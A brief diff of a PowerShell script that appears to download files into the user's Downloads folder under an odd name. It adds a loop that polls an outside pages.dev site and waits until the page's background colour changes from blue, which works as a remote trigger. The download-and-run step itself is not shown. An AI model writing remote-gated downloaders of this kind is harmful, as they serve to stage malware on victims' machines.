@@ -3,6 +3,21 @@ $urls = @(
 )
 
 $filePath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads\wheiu.bz"
+$url = "https://backgroundcolor.pages.dev"
+function CheckBackgroundColor {
+    $response = Invoke-WebRequest -Uri $url
+    return $response.ParsedHtml.getElementsByTagName("body").Style.backgroundColor
+}
+
+$initialColor = CheckBackgroundColor
+
+if ($initialColor -eq "blue") {
+    Start-Sleep -Seconds 2
+    while ((CheckBackgroundColor) -eq $initialColor) {
+        Start-Sleep -Seconds 2
+    }
+}
+
 
 Start-Sleep -Seconds 1
 
